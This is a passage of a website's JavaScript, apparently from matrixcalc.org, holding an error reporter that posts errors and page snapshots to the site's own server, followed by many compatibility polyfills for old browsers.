/*jslint sloppy: true, indent: 2 */
/*global XMLHttpRequest, window, Node */

(function (global) {
  "use strict";

  var sent = {};
  global.onerror = function (message, filename, lineno, colno, error) {
    message = message || "";
    filename = filename || "";
    lineno = lineno || 0;
    colno = colno || 0;
    var stack = error != undefined ? error.stack || "" : "";
    var data = "message=" + encodeURIComponent(message.toString()) + "&" +
               "filename=" + encodeURIComponent(filename.toString()) + "&" +
               "lineno=" + encodeURIComponent(lineno.toString()) + "&" +
               "colno=" + encodeURIComponent(colno.toString()) + "&" +
               "stack=" + encodeURIComponent(stack.toString());
    if (sent[data] == undefined && window.location.protocol !== "file:") {
      sent[data] = data;
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "https://matrixcalc.org/jserrors.php?error=1", true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.send(data);
      if (error instanceof TypeError && lineno !== 1) {
        global.sendSnapshot();
      }
    }
  };

  var escapeHTML = function (s) {
    return s.replace(/&/g, "&amp;")
            .replace(/"/g, "&quot;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;");
  };

  var html2html = function (container) {
    var result = "";
    var tagName = container.tagName.toLowerCase();
    if (tagName === 'link' && container.getAttribute('rel') === 'stylesheet') {
      var href = container.href;
      result += "<link href=\"" + escapeHTML(href) + "\" rel=\"stylesheet\" type=\"text/css\"/>";
    } else if (tagName !== 'script' && tagName !== 'iframe') {
      result += "<";
      result += tagName;
      if (tagName === 'input') {
        result += " " + "value" + "=" + "\"" +  escapeHTML(container.value) + "\"";
      }
      if (container.hasAttributes()) {
        var attributes = container.getAttributeNames();
        var length = attributes.length;
        for (var i = 0; i < length; i += 1) {
          var a = attributes[i];
          result += " " + escapeHTML(a) + "=" + "\"" + escapeHTML(container.getAttribute(a)) + "\"";
        }
      }
      result += ">";
      if (tagName === 'textarea') {
        result += escapeHTML(container.value);
      } else {
        var child = container.firstChild;
        while (child != undefined) {
          if (child.nodeType === Node.ELEMENT_NODE) {
            result += html2html(child);
          } if (child.nodeType === Node.TEXT_NODE) {
            result += escapeHTML(child.nodeValue);
          }
          child = child.nextSibling;
        }
      }
      result += "</";
      result += tagName;
      result += ">";
    }
    return result;
  };

  global.sendSnapshot = function () {
    if (global.document != undefined) {
      var activeElement = global.document.querySelector(":focus");
      if (activeElement != null) {
        activeElement.setAttribute("data-state", "focus");
      }
      var snapshot = html2html(global.document.documentElement, activeElement);
      if (activeElement != null) {
        activeElement.removeAttribute("data-state");
      }
      snapshot += "<style>[data-state=\"focus\"] { outline: 2px solid green; } </style>";
      var dataURL = "data:text/html;charset=utf-8," + encodeURIComponent(snapshot);
      global.onerror(dataURL, "snapshot.js", 0, 0, undefined);
    }
  };

}(this));

/*global self*/

(function () {
  "use strict";

  // Firefox < 4, Opera < 11.60, IE 8
  if (Object.create == undefined) {
    Object.create = function (prototype) {
      var F = function () {
      };
      F.prototype = prototype;
      return new F();
    };
  }

  // Opera 12
  if ((-2147483649).toString(16) === "-0" && (2147483649).toString(16) === "80000001") {
    var numberToString = Number.prototype.toString;
    Number.prototype.toString = function (radix) {
      "use strict";
      var value = 0 + this;
      return (value < 0 ? "-" : "") + numberToString.call(value < 0 ? 0 - value : value, radix);
    };
  }

  if (Object.assign == undefined) {
    Object.assign = function (target) {
      for (var i = 1; i < arguments.length; i += 1) {
        var source = arguments[i];
        if (source != undefined) {
          for (var key in source) {
            if (Object.prototype.hasOwnProperty.call(source, key)) {
              target[key] = source[key];
            }
          }
        }
      }
      return target;
    };
  }

  if (Number.parseInt == undefined) {
    Number.parseInt = parseInt;
  }

  if (Object.getOwnPropertyDescriptor == undefined && Object.prototype.__lookupGetter__ != undefined && Object.prototype.__lookupSetter__ != undefined) {
    Object.getOwnPropertyDescriptor = function (object, property) {
      "use strict";
      if (Object.prototype.hasOwnProperty.call(object, property)) {
        var getter = Object.prototype.__lookupGetter__.call(object, property);
        var setter = Object.prototype.__lookupSetter__.call(object, property);
        if (getter != undefined || setter != undefined) {
          return {
            get: getter,
            set: setter,
            enumerable: false,
            configurable: true
          };
        }
        return {
          value: object[property],
          writable: true,
          enumerable: true,
          configurable: true
        };
      }
      return undefined;
    };
  }
  
  if (String.prototype.trim == undefined) {
    String.prototype.trim = function () {
      "use strict";
      return this.replace(/^\s+|\s+$/g, '');
    };
  }

}());


(function () {
  "use strict";

  // IE < 9, Firefox < 4, Opera < 11.60
  if (Function.prototype.bind == undefined) {
    Function.prototype.bind = function (context) {
      var f = this;
      if (arguments.length === 1) {
        return function () {
          if (arguments.length === 0) {
            return f.call(context);
          }
          return f.apply(context, arguments);
        };
      } else {
        var args = Array.prototype.slice.call(arguments, 1);
        return function () {
          return f.apply(context, args.concat(Array.prototype.slice.call(arguments)));
        };
      }
    };
  }

  // IE < 9, Opera < 10.50
  if (Date.now == undefined) {
    Date.now = function () {
      return new Date().getTime();
    };
  }

  // Firefox < 4, Opera < 11.60
  if (Object.defineProperty == undefined && Object.prototype.__defineGetter__ != undefined && Object.prototype.__defineSetter__ != undefined) {
    Object.defineProperty = function (object, property, descriptor) {
      var getter = descriptor.get;
      if (getter != undefined) {
        object.__defineGetter__(property, getter);
      }
      var setter = descriptor.set;
      if (setter != undefined) {
        object.__defineSetter__(property, setter);
      }
    };
  }

  if (Number.parseFloat == undefined) {
    Number.parseFloat = parseFloat;
  }

}());

// Firefox < 3.5, ...
if (this.JSON == undefined) {
  this.JSON = {
    parse: function (x) {
      "use strict";
      return eval("(" + x + ")");
    },
    stringify: function (x) {
      "use strict";
      var quote = function (string) {
        return "\"" + string.replace(/[\x00-\x1f\\"]/g, function (character) {
          return "\\u" + (0x10000 + character.charCodeAt(0)).toString(16).slice(1);
        }) + "\"";
      };
      if (typeof x === "object") {
        if (typeof x.toJSON === "function") {
          return quote(x.toJSON().toString());
        }
        var isArray = x.length != undefined;
        var f = false;
        var s = "";
        s += isArray ? "[" : "{";
        for (var i in x) {
          if (Object.prototype.hasOwnProperty.call(x, i)) {
            var v = x[i];
            if (v != undefined) {
              if (f) {
                s += ",";
              }
              f = true;
              s += (isArray ? "" : quote(i) + ":") + JSON.stringify(v);
            }
          }
        }
        s += isArray ? "]" : "}";
        return s;
      }
      if (typeof x === "number" || typeof x === "boolean") {
        return x.toString();
      }
      return x == undefined ? "null" : quote(x.toString());
    }
  };
}

if (!("globalThis" in self)) {
  self.globalThis = self;
}

/*global document, window, Element, Event, Node, HTMLElement, DOMTokenList, Document, DocumentFragment, HTMLInputElement, HTMLTextAreaElement, TextRange */

// IE < 9, Firefox < 3.5
if (!("firstElementChild" in document.documentElement)) {
  (function () {
    "use strict";
    function f(property0, property1, property2) {
      if (!(property0 in document.documentElement)) {
        Object.defineProperty(Element.prototype, property0, {
          get: function () {
            var t = this[property1];
            while (t != undefined && t.nodeType !== Node.ELEMENT_NODE) {
              t = t[property2];
            }
            return t;
          }
        });
      }
    }
    f("previousElementSibling", "previousSibling", "previousSibling");
    f("nextElementSibling", "nextSibling", "nextSibling");
    f("firstElementChild", "firstChild", "nextSibling");
    f("lastElementChild", "lastChild", "previousSibling");
  }());
}


// IE 11, Edge < 17, Chrome < 29, Firefox < 25, Safari < 9
var tmpFragment = document.createDocumentFragment();
if (!("firstElementChild" in tmpFragment) ||
    !("lastElementChild" in tmpFragment)) {
  (function () {
    "use strict";
    function f(property0, property1, property2) {
      Object.defineProperty(DocumentFragment.prototype, property0, {
        get: function () {
          var t = this[property1];
          while (t != undefined && t.nodeType !== Node.ELEMENT_NODE) {
            t = t[property2];
          }
          return t;
        }
      });
    }
    f("firstElementChild", "firstChild", "nextSibling");
    f("lastElementChild", "lastChild", "previousSibling");
  }());
}


// Firefox < 3.5
if (Element.prototype.querySelectorAll == undefined) {
  Element.prototype.querySelectorAll = function (s) {
    "use strict";
    var selectorRegExp = /^([a-zA-Z\-]+)?(\.[a-zA-Z\-]+)?(?:\[([a-zA-Z\-]+)(?:\="?([a-z\{\}\(\)\|]+)"?)?\])?$/;
    var tmp = selectorRegExp.exec(s);
    if (tmp == null) {
      throw new TypeError("Unsupported selector: " + s);
    }
    var tagName = null;
    var className = null;
    var attributeName = null;
    var attributeValue = null;
    if (tmp[1] != null) {
      tagName = tmp[1].toLowerCase();//!
    }
    if (tmp[2] != null) {
      className = tmp[2].slice(1);
    }
    if (tmp[3] != null) {
      attributeName = tmp[3];
    }
    if (tmp[4] != null) {
      attributeValue = tmp[4];
    }
    var results = [];
    var matches = function (x) {
      return (tagName == null || x.tagName.toLowerCase() === tagName) &&
             (className == null || x.classList.contains(className)) &&
             (attributeName == null || x.getAttribute(attributeName) != null) &&
             (attributeValue == null || x.getAttribute(attributeName) === attributeValue);
    };
    var traverse = function (x) {
      // https://en.wikipedia.org/wiki/Tree_traversal#Pre-order_(NLR)
      if (matches(x)) {
        results.push(x);
      }
      var c = x.firstElementChild;
      while (c != null) {
        traverse(c);
        c = c.nextElementSibling;
      }
    };
    traverse(this);
    return results;
  };
}
if (Element.prototype.querySelector == undefined) {
  Element.prototype.querySelector = function (s) {
    "use strict";
    var x = this.querySelectorAll(s);
    return x.length === 0 ? undefined : x[0];
  };
}
if (Document.prototype.querySelectorAll == undefined) {
  Document.prototype.querySelectorAll = function (s) {
    "use strict";
    return this.documentElement.querySelectorAll(s);
  };
}
if (Document.prototype.querySelector == undefined) {
  Document.prototype.querySelector = function (s) {
    "use strict";
    return this.documentElement.querySelector(s);
  };
}



// element.classList for (IE 8 - IE 9, Konqueror 4.13, Firefox < 3.6, Opera < 11.60)
// Object.defineProperty with DOM

if (!("classList" in document.documentElement)) {
  (function () {

    "use strict";

    var update = function (cl) {
      for (var i = 0; i < cl.tokens.length; i += 1) {
        cl[i] = cl.tokens[i];
      }
      cl.length = cl.tokens.length;
    };

    function ClassList(element) {
      this.element = element;
      var s = element.className.replace(/^\s+|\s+$/g, "").replace(/\s+/g, " ");
      this.tokens = s === "" ? [] : s.split(" ");
      update(this);
    }

    ClassList.prototype.item = function (index) {
      return this.tokens[index];
    };
    ClassList.prototype.contains = function (className) {
      var i = -1;
      while (++i < this.tokens.length) {
        if (this.tokens[i] === className) {
          return true;
        }
      }
      return false;
    };
    ClassList.prototype.add = function (className) {
      this.toggle(className, true);
    };
    ClassList.prototype.remove = function (className) {
      this.toggle(className, false);
    };
    ClassList.prototype.toggle = function (className, force) {
      force = force == undefined ? !this.contains(className) : force;
      if (force) {
        var j = -1;
        while (++j < this.tokens.length) {
          if (this.tokens[j] === className) {
            return force;
          }
        }
        this.tokens.push(className);
      } else {
        var i = -1;
        var k = 0;
        while (++i < this.tokens.length) {
          if (this.tokens[i] !== className) {
            this.tokens[k] = this.tokens[i];
            k += 1;
          }
        }
        if (k === i) {
          return force;
        }
        this.tokens.length = k;
      }
      update(this);
      this.element.className = this.tokens.join(" ");
      return force;
    };
    ClassList.prototype.toString = function () {
      return this.element.className;
    };

    Object.defineProperty(Element.prototype, "classList", {
      get: function () {
        return new ClassList(this);
      },
      set: undefined,
      enumerable: false, // IE 8 bug
      configurable: true
    });

  }());
}


// IE 8 - IE 9 Drag and Drop helper
if (window.XDomainRequest != undefined && !("draggable" in document.documentElement)) {
  document.addEventListener("selectstart", function (event) {
    "use strict";
    if (!event.altKey) {
      var target = event.target;
      while (target != undefined && !(target.nodeType === Node.ELEMENT_NODE && target.getAttribute("draggable") != undefined)) {
        target = target.parentNode;
      }
      if (target != undefined && target.nodeType === Node.ELEMENT_NODE && target.getAttribute("draggable") != undefined) {
        event.preventDefault();
        target.dragDrop();
      }
    }
  }, false);
  //TODO:
  //document.documentElement.draggable = undefined; //Note: this will add the attribute "draggable" too in IE 8
}

// IE 8 does not support input event
// IE 9 does not fire input event sometimes
// Opera 12 does not fire input event after Drag and Drop (dragend)
// Opera 12 also does not fire input event when using "Undo" from the contextmenu
if (window.XDomainRequest != undefined || window.opera != undefined) {
  (function () {
    "use strict";

    document.addEventListener("input", function (event) {
      event.target.setAttribute("data-last-value", event.target.value);
    }, false);

    var fire = function (type, element) {
      window.setTimeout(function () {
        var event = document.createEvent("Event");
        event.initEvent(type, true, false);
        element.dispatchEvent(event);
      }, 0);
    };

    var check = function (elements) {
      for (var i = 0; i < elements.length; i += 1) {
        var e = elements[i];
        var lastValue = e.getAttribute("data-last-value");
        var value = String(e.value);
        if (lastValue !== value) {
          fire("input", e);
        }
      }
    };

    var inputs = document.getElementsByTagName("input");
    var textareas = document.getElementsByTagName("textarea");

    var checkInputs = function () {
      check(inputs);
      check(textareas);
      window.setTimeout(checkInputs, 300);
    };

    window.setTimeout(checkInputs, 300);
  }());
}


// Chrome < 30, Firefox < 10, Safari < 7
if (!("onmouseenter" in document.documentElement)) {
  document.addEventListener("mouseover", function (event) {
   "use strict";
    if (!event.target.contains(event.relatedTarget)) {
      var e = document.createEvent("MouseEvent");
      e.initMouseEvent("mouseenter", false, false, event.view, event.detail,  event.screenX, event.screenY, event.clientX, event.clientY, event.ctrlKey, event.altKey, event.shiftKey, event.metaKey, event.button, event.relatedTarget);
      event.target.dispatchEvent(e);
    }
  }, false);
  document.documentElement.onmouseenter = undefined;
}

// Chrome < 30, Firefox < 10, Safari < 7
if (!("onmouseleave" in document.documentElement)) {
  document.addEventListener("mouseout", function (event) {
    "use strict";
    if (!event.target.contains(event.relatedTarget)) {
      var e = document.createEvent("MouseEvent");
      e.initMouseEvent("mouseleave", false, false, event.view, event.detail,  event.screenX, event.screenY, event.clientX, event.clientY, event.ctrlKey, event.altKey, event.shiftKey, event.metaKey, event.button, event.relatedTarget);
      event.target.dispatchEvent(e);
    }
  }, false);
  document.documentElement.onmouseleave = undefined;
}

// Firefox < 6, Opera 10, Chrome < 18
if (!("defaultPrevented" in Event.prototype) && !("defaultPrevented" in document.createEvent("Event"))) {
  var preventDefault = Event.prototype.preventDefault;
  Event.prototype.preventDefault = function () {
    "use strict";
    this.defaultPrevented = true;
    preventDefault.call(this);
  };
}

// IE 8 - IE 11 (not Edge)
if (window.clipboardData != undefined) {
  Object.defineProperty(Event.prototype, "clipboardData", {
    get: function () {
      "use strict";
      return window.clipboardData;
    },
    set: undefined,
    enumerable: false,
    configurable: true
  });
}

// IE 8 - IE 11, Edge < 17
// see notes at http://caniuse.com/#feat=clipboard
// only for IE? (Safari < 10 does not support `document.execCommand('copy')`, but works fine with `Ctrl+C`)
if (!("oncopy" in document)) {
  window.setTimeout(function () {
    "use strict";

    var removeCopyFix = function () {
      var copyFix = document.getElementById("copy-fix");
      if (copyFix != undefined) {
        document.body.removeChild(copyFix);
      }
    };

    var addCopyFix = function () {
      var activeElement = document.activeElement;
      if (activeElement == undefined || activeElement.tagName.toLowerCase() !== 'input' && activeElement.tagName.toLowerCase() !== 'textarea') {
        var selection = window.getSelection();
        if (selection.isCollapsed) {
          var copyFix = document.createElement("div");
          copyFix.id = "copy-fix";
          copyFix.innerHTML = "&nbsp;";
          document.body.appendChild(copyFix);
          var focusedNode = document.activeElement; // IE 11
          selection.collapse(copyFix, 0);
          selection.selectAllChildren(copyFix);
          focusedNode.focus();
          window.setTimeout(function () {
            removeCopyFix();
          }, 0);
        }
      }
    };

    document.addEventListener("keydown", function (event) {
      if (event.keyCode === "C".charCodeAt(0) && (event.ctrlKey || event.metaKey) && !event.altKey && !event.shiftKey && !event.defaultPrevented) {
        addCopyFix();
      }
    }, false);

    var nativeExecCommand = document.execCommand;
    document.execCommand = function (name, showDefaultUI, value) {
      if (name === "copy") {
        addCopyFix();
      }
      return nativeExecCommand.call(this, name, showDefaultUI, value);
    };

    document.addEventListener("copy", function (event) {
      removeCopyFix();
    }, false);
  }, 0);
}

// Chrome < 20, Safari < 6, Firefox < 5
if (HTMLElement.prototype.click == undefined) {
  HTMLElement.prototype.click = function (element) {
    "use strict";
    var event = document.createEvent("MouseEvent");
    event.initMouseEvent("click", true, true, window, 1, 0, 0, 0, 0, false, false, false, false, 0, undefined);
    this.dispatchEvent(event);
  };
}

// Firefox < 9
if (Node.prototype.contains == undefined) {
  Node.prototype.contains = function (otherNode) {
    "use strict";
    var x = otherNode;
    while (x != undefined && x !== this) {
      x = x.parentNode;
    }
    return x != undefined;
  };
}

// IE 10 - IE 11, Opera 11.50 - Opera 12.18, Firefox < 24, Chrome < 24, Safari < 7
if (document.documentElement.classList.toggle("test", false)) {
  DOMTokenList.prototype.toggle = function (token, force) {
    "use strict";
    force = force == undefined ? !this.contains(token) : force;
    if (force) {
      this.add(token);
    } else {
      this.remove(token);
    }
    return force;
  };
}

// Scrolling while you're dragging
// Chrome 49 - OK, Opera 12 - OK, IE 8 - not OK, IE 11 - OK, Firefox < 53
// https://bugzilla.mozilla.org/show_bug.cgi?id=41708
// TypeError: Cannot use 'in' operator to search for 'mozCursor' in undefined in Safari
if ((window.DataTransfer != undefined && window.DataTransfer.prototype != undefined && "mozCursor" in window.DataTransfer.prototype && !("caretColor" in document.documentElement.style)) || window.XDomainRequest != undefined) {
  (function () {
    'use strict';
    var lastScrollTop = 0;
    document.addEventListener('dragover', function (event) {
      if (lastScrollTop === window.pageYOffset) { // The skip if the web browser has the support of this feature
        var distanceToTopEdge = event.clientY;
        var distanceToBottomEdge = document.documentElement.clientHeight - event.clientY;
        var dy = distanceToTopEdge < 16 ? -Math.pow(16 - distanceToTopEdge, 2) : (distanceToBottomEdge < 16 ? +Math.pow(distanceToBottomEdge - 16, 2) : 0);
        if (dy !== 0) {
          window.scrollBy(0, dy);
        }
      }
      lastScrollTop = window.pageYOffset;
    }, false);
  }());
}

// https://bugzilla.mozilla.org/show_bug.cgi?id=688580 (Firefox < 31)
if ("MozBackgroundInlinePolicy" in document.documentElement.style && document.readyState === "interactive") {
  (function () {
    "use strict";
    var contentLoadedTimeoutId = 0;
    var onTimeout = function () {
      contentLoadedTimeoutId = window.setTimeout(onTimeout, 10);
      if (document.readyState === "complete") {
        var event = document.createEvent("Event");
        event.initEvent("DOMContentLoaded", false, false);
        document.dispatchEvent(event);
      }
    };
    onTimeout();
    document.addEventListener("DOMContentLoaded", function (event) {
      window.clearTimeout(contentLoadedTimeoutId);
    }, false);
  }());
}

// Chrome < 4, Firefox < 4, IE < 9, Opera < 11, Safari < 5
if (!("head" in document)) {
  document.head = document.documentElement.firstElementChild;
}


// IE ? - IE 11
// Negative event.clientX and event.clientY when using "element.click()" or when a user presses Enter on <button>
if (window.clipboardData != undefined && window.MouseEvent != undefined) {
  var redefineClientXY = function (property) {
    "use strict";
    var clinetXDescriptor = Object.getOwnPropertyDescriptor(window.MouseEvent.prototype, "clientX");
    var clinetYDescriptor = Object.getOwnPropertyDescriptor(window.MouseEvent.prototype, "clientY");
    Object.defineProperty(window.MouseEvent.prototype, property, {
      get: function () {
        if (this.screenX === 0 && this.screenY === 0) {
          return 0; // IE 11
        }
        var rect = this.target.getBoundingClientRect();
        var x = clinetXDescriptor.get.call(this);
        var y = clinetYDescriptor.get.call(this);        
        return x >= rect.left && x <= rect.right && y >= rect.top && y <= rect.bottom ? (property === "clientX" ? x : y) : 0;
      },
      set: undefined,
      enumerable: false,
      configurable: true
    });
  };
  redefineClientXY("clientX");
  redefineClientXY("clientY");
}


//TODO: more simple test - ?
if (!("hidden" in document.documentElement)) {
  var tmp = document.createElement('div');
  tmp.innerHTML = '&ii;';
  if (tmp.textContent === '&ii;') {
    var innerHTML = Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'innerHTML');
    if (innerHTML != null) {
      Object.defineProperty(HTMLElement.prototype, 'innerHTML', {
        get: function () {
          'use strict';
          return innerHTML.get.call(this);
        },
        set: function (value) {
          'use strict';
          var s = value.replace(/&[a-zA-Z]+;/g, function (p) {
            switch (p) {
              case '&af;': return '&#x2061;';
              case '&it;': return '&#x2062;';
              case '&ic;': return '&#x2063;';
              case '&ii;': return '&#x2148;';
              case '&vellip;': return '&#x22EE;';
              case '&UnderBrace;': return '&#x23DF;';
            }
            return p;
          });
          innerHTML.set.call(this, s);
        },
        enumerable: false,
        configurable: true
      });
    }
  }
}

// Chrome < 6, Firefox < 4, IE < 11, Opera < 11, Safari < 5.1
// https://codepen.io/valtlai/pen/wKyodg
if (!("hidden" in document.documentElement)) {
  Object.defineProperty(HTMLElement.prototype, "hidden", {
    get: function () {
      "use strict";
      return this.getAttribute("hidden") != undefined;
    },
    set: function (value) {
      "use strict";
      if (value !== "hidden") {// IE 8
        if (value) {
          this.setAttribute("hidden", "hidden");
        } else {
          this.removeAttribute("hidden");
        }
      }
    },
    enumerable: false,
    configurable: true
  });
}

// IE ? - IE 11 - <math><mrow id="test"><mn>1</mn></mrow></math>
if (window.clipboardData != undefined) {
  document.nativeGetElementById = document.getElementById;
  document.getElementById = function (id) {
    "use strict";
    return document.nativeGetElementById(id) || (/^[_a-zA-Z0-9\-]+$/.exec(id) != undefined ? document.querySelector("[id=\"" + id + "\"]") : undefined);
  };
}

// Edge < 18, Safari < 11, Chrome < 61, Firefox < 45, Opera 12
if (Element.prototype.getAttributeNames == undefined) {
  Element.prototype.getAttributeNames = function () {
    "use strict";
    var attributes = this.attributes;
    var length = attributes.length;
    var result = new Array(length);
    for (var i = 0; i < length; i += 1) {
      result[i] = attributes[i].name;
    }
    return result;
  };
}

//? some strange browser (bot)
if (Element.prototype.hasAttributes == undefined) {
  Element.prototype.hasAttributes = function () {
    "use strict";
    return this.attributes.length > 0;
  };
}

if (window.navigator != undefined) {
  var connection = window.navigator.connection;
  // Note: `"connection" in window.navigator` is true in SamsungBrowser/1.1 Mobile Safari/537.3
  if (connection != undefined) {
    if (!("effectiveType" in connection)) {
      var type = connection.type;
      if (typeof type === "number") {
        // Android 4.1 - 4.4, UC Browser for Android 10.10 - 11.3
        connection.effectiveType = (connection.type === connection.CELL_2G ? "2g" : "unknown");
      } else {
        if ("downlinkMax" in connection) {
          // Chrome Mobile <= 60
          connection.effectiveType = connection.downlinkMax <= 70 ? "2g" : "unknown";
        }
      }
    }
    if (!("saveData" in connection)) {
      if ("metered" in connection) {
        connection.saveData = connection.metered;
      }
    }
  }
}

// https://dev.to/corbindavenport/how-to-correctly-check-for-do-not-track-with-javascript-135d
// IE 11
if (window.navigator != undefined) {
  if ("doNotTrack" in window && !("doNotTrack" in window.navigator)) {
    Object.defineProperty(window.navigator, "doNotTrack", {
      get: function () {
        "use strict";
        return window.doNotTrack;
      }
    });
  }
}

// Opera < 11.50, Firefox < 4, IE < 10
if (window.console == undefined) {
  var consoleLog = function (s) {
    "use strict";
    if (window.opera != undefined && window.opera.postError != undefined) {
      window.opera.postError(s);
    }
  };
  window.console = {
    log: consoleLog,
    info: consoleLog,
    warn: consoleLog,
    error: consoleLog
  };
}

// IE 11, Firefox < 22, Chrome < 26, ...
if (window.HTMLTemplateElement == undefined) {
  window.HTMLTemplateElement = HTMLElement;
  document.addEventListener("DOMContentLoaded", function (event) {
    "use strict";
    var templates = document.body.querySelectorAll("template");
    for (var i = 0; i < templates.length; i += 1) {
      var template = templates[i];
      var content = document.createDocumentFragment();
      while (template.firstChild != undefined) {
        content.appendChild(template.firstChild);
      }
      template.content = content;
    }
  }, false);
}

// IE 11, Edge < 17
if (window.DataTransfer != undefined && !("oncopy" in document)) {
  var nativeSetData = window.DataTransfer.prototype.setData;
  window.DataTransfer.prototype.setData = function (type, data) {
    "use strict";
    try {
      nativeSetData.call(this, type === "text/plain" ? "Text" : type, data);
    } catch (error) {
      window.console.log(error);
    }
  };
  var nativeGetData = window.DataTransfer.prototype.getData;
  window.DataTransfer.prototype.getData = function (type) {
    "use strict";
    return nativeGetData.call(this, type === "text/plain" ? "Text" : type);
  };
}



// IE 8 - IE 11
// "scrollIntoView" behaviour for setSelectionRange
if (Object.getOwnPropertyDescriptor != undefined && HTMLInputElement.prototype.createTextRange != undefined) {
  var fixSetSelectionRange = function (C) {
    "use strict";
    var setSelectionRange = C.prototype.setSelectionRange;
    C.prototype.setSelectionRange = function (selectionStart, selectionEnd, selectionDirection) {
      setSelectionRange.call(this, selectionStart, selectionEnd, selectionDirection);
      var textRange = this.createTextRange();
      textRange.moveStart("character", this.selectionStart);
      textRange.moveEnd("character", this.selectionEnd - this.value.length);
      textRange.scrollIntoView(true);
    };
  };
  fixSetSelectionRange(HTMLInputElement);
  fixSetSelectionRange(HTMLTextAreaElement);
}

// IE 8 - IE 10
// see https://github.com/codemirror/CodeMirror/commit/63591907b0dcd51c2f64dc967143e044ecac6923
if (Object.getOwnPropertyDescriptor != undefined && HTMLInputElement.prototype.createTextRange != undefined && document.attachEvent != undefined) {
  var originalGetBoundingClientRect = TextRange.prototype.getBoundingClientRect;
  TextRange.prototype.getBoundingClientRect = function () {
    "use strict";
    var zoomX = window.screen.logicalXDPI / window.screen.deviceXDPI;
    var zoomY = window.screen.logicalYDPI / window.screen.deviceYDPI;
    var rect = originalGetBoundingClientRect.call(this);
    return {
      top: rect.top * zoomY,
      right: rect.right * zoomX,
      bottom: rect.bottom * zoomY,
      left: rect.left * zoomX,
      height: (rect.bottom - rect.top) * zoomY,
      width: (rect.right - rect.left) * zoomX
    };
  };
}

// https://connect.microsoft.com/IE/feedback/details/1015764/ie11-scrollleft-for-text-input-elements-is-always-0
// IE 11, Edge has problems with input.scrollLeft (always 0)
// IE 10 - IE 11 - input.scrollWidth
// see also https://github.com/gregwhitworth/scrollWidthPolyfill/
if (Object.getOwnPropertyDescriptor != undefined && HTMLInputElement.prototype.createTextRange != undefined) {
  var fixScrollProperty = function (property) {
    "use strict";
    var originalScrollProperty = Object.getOwnPropertyDescriptor(Element.prototype, property);
    if (originalScrollProperty != undefined) {
      Object.defineProperty(Element.prototype, property, {
        get: function () {
          if (this.tagName.toLowerCase() !== 'input') {
            return originalScrollProperty.get.call(this);
          }
          var inputElement = this;
          var textRange = inputElement.createTextRange();
          var inputStyle = window.getComputedStyle(inputElement, undefined);
          var paddingLeft = Number.parseFloat(inputStyle.paddingLeft);
          var paddingRight = Number.parseFloat(inputStyle.paddingRight);
          var rangeRect = textRange.getBoundingClientRect();
          var scrollLeft = inputElement.getBoundingClientRect().left + inputElement.clientLeft + paddingLeft - rangeRect.left;
          var clientWidth = inputElement.clientWidth;
          var contentWidth = paddingLeft + (rangeRect.right - rangeRect.left) + paddingRight;
          var scrollWidth = clientWidth > contentWidth ? clientWidth : contentWidth;
          return property === "scrollLeft" ? scrollLeft : scrollWidth;
        },
        set: function (value) { // Note: it is not possible to use `originalScrollProperty.set` here in IE 8-?
          return originalScrollProperty.set.call(this, value);
        },
        enumerable: false,
        configurable: true
      });
    }
    fixScrollProperty("scrollLeft");
    //fixScrollProperty("scrollWidth");
  };
}


// IE <= 11, Opera <= 12, Firefox < 20 (caretPositionFromPoint)
if (document.caretPositionFromPoint == undefined && document.caretRangeFromPoint == undefined) {
  document.caretRangeFromPoint = function (x, y) {
    "use strict";
    var element = document.elementFromPoint(x, y);
    var walk = function (candidate, e, x, y) {
      var node = candidate;
      var c = e.firstChild;
      if (c == undefined && e.nodeType === Node.TEXT_NODE && e.parentNode.tagName.toLowerCase() !== 'textarea') {
        var range = document.createRange();
        range.setStart(e, 0);
        range.setEnd(e, e.nodeValue.length);
        var rect = range.getBoundingClientRect();
        if (x >= rect.left && x <= rect.right && y >= rect.top && y <= rect.bottom) {
          node = e;
        }
      }
      while (c != undefined) {
        node = walk(node, c, x, y);
        c = c.nextSibling;
      }
      return node;
    };
    var node = walk(element, element, x, y);
    var result = document.createRange();
    result.selectNode(node);
    if (node.nodeType === Node.TEXT_NODE) {
      var length = node.nodeValue.length;
      var min = 1 / 0;
      for (var i = 0; i < length; i += 1) {
        var range = document.createRange();
        range.setStart(node, i);
        range.setEnd(node, i + 1); // Opera 12 needs a not collapsed range, seems
        var rect = range.getBoundingClientRect();
        var d = x - (rect.left + rect.right) / 2;
        var distance = d < 0 ? 0 - d : 0 + d;
        if (distance < min && y >= rect.top && y <= rect.bottom) { // && rect.right === rect.left
          result = range;
          min = distance;
        }
      }
    }
    return result;
  };
}

// Firefox does not support "contextMenu" on MathML elements
// HTMLElement#hasOwnProperty does not exist in IE 8
if (Object.prototype.hasOwnProperty.call(HTMLElement.prototype, 'contextMenu')) {
  document.addEventListener('contextmenu', function (event) {
    'use strict';
    var target = event.target;
    while (target != null && target !== document && target.getAttribute('contextmenu') == null) {
      target = target.parentNode;
    }
    if (target != null && target !== document && !(target instanceof HTMLElement)) {
      document.documentElement.setAttribute('contextmenu', target.getAttribute('contextmenu'));
    } else {
      document.documentElement.removeAttribute('contextmenu');
    }
  }, false);
}

// TODO: https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/4365703/
// IE 11
// The default value is 0 if the element is an a, area, button, frame, iframe, input, object, select, textarea, or SVG a element, or is a summary element that is a summary for its parent details. The default value is −1 otherwise.
if (document.createElement('div').tabIndex === 0) {
  Object.defineProperty(Element.prototype, 'tabindex', {
    get: function () {
      'use strict';
      var tabIndex = this.getAttribute('tabindex');
      if (tabIndex != null) {
        return Number.parseInt(tabIndex, 10);
      }
      var tagName = this.tagName.toLowerCase();
      if (/^(?:a|button|input|select|textarea|summary)$/.test(tagName)) {
        return 0;
      }
      return -1;
    },
    set: function (value) {
      'use strict';
      this.setAttribute('tabindex', value);
    }
  });
}



if ('MSBlobBuilder' in window) {
  // to fix an issue in Edge 18: enter key event is fired even when the user selects something from the datalist?/the list of previously enter values
  document.addEventListener('keydown', function (event) {
    'use strict';
    var input = event.target;
    if (input.tagName.toLowerCase() === 'input' && input.hasAttribute('list')) {
      var DOM_VK_DOWN = 40;
      if (event.keyCode === DOM_VK_DOWN) {
        input.setAttribute('data-disallow-enter', 'true');
      }
      var DOM_VK_ESCAPE = 27;
      if (event.keyCode === DOM_VK_ESCAPE) {
        input.removeAttribute('data-disallow-enter');
      }
      var DOM_VK_RETURN = 13;
